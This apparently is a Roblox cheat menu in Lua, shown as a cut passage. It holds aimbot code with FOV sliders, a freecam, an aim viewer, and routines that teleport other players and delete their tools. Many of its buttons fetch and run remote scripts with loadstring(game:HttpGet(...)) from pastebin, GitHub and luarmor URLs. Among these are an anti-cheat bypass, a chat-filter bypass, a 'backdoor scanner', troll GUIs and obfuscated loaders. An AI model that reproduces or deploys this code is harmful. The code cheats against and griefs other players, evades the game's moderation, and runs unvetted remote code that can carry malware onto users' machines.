-- Aimbot ON/OFF Toggle button (bottom)
AimbotToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimbotToggleButton.Position = UDim2.new(0.1, 0, 0.85, 0)
AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
AimbotToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
AimbotToggleButton.TextSize = 14
AimbotToggleButton.Font = Enum.Font.SourceSansBold
AimbotToggleButton.Text = "Aimbot: On"
AimbotToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
FOVToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        FOVToggleButton.Text = "FOV: Visible"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        FOVToggleButton.Text = "FOV: Hidden"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Toggle Aimbot functionality (ON/OFF)
AimbotToggleButton.MouseButton1Click:Connect(function()
    if Environment.Aimbot.Enabled then
        -- Turn Aimbot off
        Environment.Aimbot.Enabled = false
        AimbotToggleButton.Text = "Aimbot: Off"  -- Change text to Off
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)  -- Red background
    else
        -- Turn Aimbot on
        Environment.Aimbot.Enabled = true
        AimbotToggleButton.Text = "Aimbot: On"  -- Change text to On
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)  -- Green background
    end
end)

-- Initial setup for the slider
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT SUPPORTED CELLPHONE (MONSY)", function()
	--[[ 
    DEV TEST AIMBOT (Head Target)
    + White FOV circle
    + Mobile: works only when scoped (zoom in)
]]

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local cam = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

-- SETTINGS
local ENABLED = false
local FOV = 50         -- Aim cone in degrees
local SMOOTH = 12      -- Higher = faster aim
local MAX_DIST = 250   -- Max distance
local SCOPE_FOV = 50   -- Camera FOV threshold to consider as scoped

-- Draw FOV Circle
local fovCircle = Drawing.new("Circle")
fovCircle.Color = Color3.fromRGB(255, 255, 255) -- White
fovCircle.Thickness = 1
fovCircle.NumSides = 64
fovCircle.Radius = FOV * 2
fovCircle.Filled = false
fovCircle.Visible = true

-- Create on-screen toggle button (mobile)
local function makeToggleButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DevAutoAimToggle"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local btn = Instance.new("TextButton")
    btn.Name = "AutoAimBtn"
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(1, -150, 1, -90)
    btn.BackgroundTransparency = 0.4
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.TextSize = 16
    btn.Text = "AutoAim: OFF"
    btn.Parent = screenGui

    btn.MouseButton1Click:Connect(function()
        ENABLED = not ENABLED
        btn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
    end)
end

makeToggleButton()

-- PC toggle key
UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.O then
        ENABLED = not ENABLED
        local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("DevAutoAimToggle")
        if gui and gui:FindFirstChild("AutoAimBtn") then
            gui.AutoAimBtn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
        end
    end
end)

-- Function to get nearest target's head
local function getNearestTarget()
    local best, bestAngle = nil, math.huge
    local origin = cam.CFrame.Position
    local forward = cam.CFrame.LookVector

    for _, pl in pairs(Players:GetPlayers()) do
        if pl ~= player and pl.Character and pl.Character:FindFirstChild("Head") then
            local head = pl.Character.Head
            local dir = head.Position - origin
            local dist = dir.Magnitude
            if dist <= MAX_DIST then
                local angle = math.deg(math.acos(math.clamp(forward:Dot(dir.Unit), -1, 1)))
                if angle <= FOV/2 and angle < bestAngle then
                    -- Optional LOS check
                    local ray = Ray.new(origin, dir.Unit * dist)
                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, {player.Character}, false, true)
                    if not hit or hit:IsDescendantOf(pl.Character) then
                        best = head
                        bestAngle = angle
                    end
                end
            end
        end
    end
    return best
end

-- Auto-aim loop
RunService.RenderStepped:Connect(function(dt)
    -- Update FOV circle position
    local viewportSize = cam.ViewportSize
    fovCircle.Position = Vector2.new(viewportSize.X/2, viewportSize.Y/2)
    fovCircle.Radius = FOV * 2

    -- Mobile scope check
    local isScoped = (UserInputService.TouchEnabled and cam.FieldOfView <= SCOPE_FOV)
    
    -- Only aim if enabled + (PC or mobile scoped)
    if not ENABLED or (UserInputService.TouchEnabled and not isScoped) then
        return
    end

    local target = getNearestTarget()
    if target and target.Parent then
        local curPos = cam.CFrame.Position
        local curLook = cam.CFrame.LookVector
        local wantLook = (target.Position - curPos).Unit
        local t = 1 - math.exp(-SMOOTH * dt)
        local newLook = (curLook:Lerp(wantLook, t)).Unit
        cam.CFrame = CFrame.new(curPos, curPos + newLook)
    end
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE (MONSY)", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY AIMBOT" -- Custom Title
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(0,0,0)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- Toggle button for Show/Hide
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "FOV: Visible"
ToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
ToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        ToggleButton.Text = "FOV: Visible"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        ToggleButton.Text = "FOV: Hidden"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Initial setup
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["SCRIPT MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("BACKDOOR SCANNER (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/inks0adx",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BRING PART (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/qEw15UV3",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT SPAWNER (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/8f5yA0An",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADMIN TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/VjzUsTdB",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FLING SELECT (MONSY)", function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-fling-gui-8018"))() 
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("JERK (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CHAT TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("SHY GUY (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/SpiderScriptRBUniversal/refs/heads/main/Protected_Spider.txt"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT V2 (MONSY)", function()
	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V1 TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V2 TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADONIS BYPASS CP (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT BRING  (MONSY)", function()
	local L1 = true;
local L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L3 = L2.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
    if L_4_arg1 == 'f' then
        L1 = not L1
    end;
    if L_4_arg1 == 'r' then
        L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
        L3 = L2.Position - Vector3.new(5, 0, 0)
    end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
    if L_6_forvar2 == game.Players.LocalPlayer then
    else
        local L7 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L8, L9 = pcall(function()
                    local L10 = L_6_forvar2.Character;
                    if L10 then
                        if L10:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_6_forvar2.Backpack:ClearAllChildren()
                                for L_11_forvar1, L_12_forvar2 in pairs(L10:GetChildren()) do
                                    if L_12_forvar2:IsA("Tool") then
                                        L_12_forvar2:Destroy()
                                    end
                                end;
                                L10.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L8 then
                else
                    warn("Unnormal error: "..L9)
                end
            end)
        end)
        coroutine.resume(L7)
    end
end;
-- check for updates
game.Players.PlayerAdded:Connect(function(L_13_arg1)
    if L_13_arg1 == game.Players.LocalPlayer then
    else
        local L14 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L15, L16 = pcall(function()
                    local L17 = L_13_arg1.Character;
                    if L17 then
                        if L17:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_13_arg1.Backpack:ClearAllChildren()
                                for L_18_forvar1, L_19_forvar2 in pairs(L17:GetChildren()) do
                                    if L_19_forvar2:IsA("Tool") then
                                        L_19_forvar2:Destroy()
                                    end
                                end;
                                L17.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L15 then
                else
                    warn("Unnormal error: "..L16)
                end
            end)
        end)
        coroutine.resume(L14)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PRESS Q TO FREECAM (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 150
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("LOOP BRING ALL (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Text = "PUBLIC ENEMY LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.SourceSansBold
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black
StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER (MONSY)", function()
	--// PUBLIC ENEMY AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black title bg
Title.Text = "PUBLIC ENEMY AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red text (off)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR (MONSY)", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AntiHeadshotGUI"
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(0,0,0)
PlayerList.Font = Enum.Font.Code
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(0,0,0)
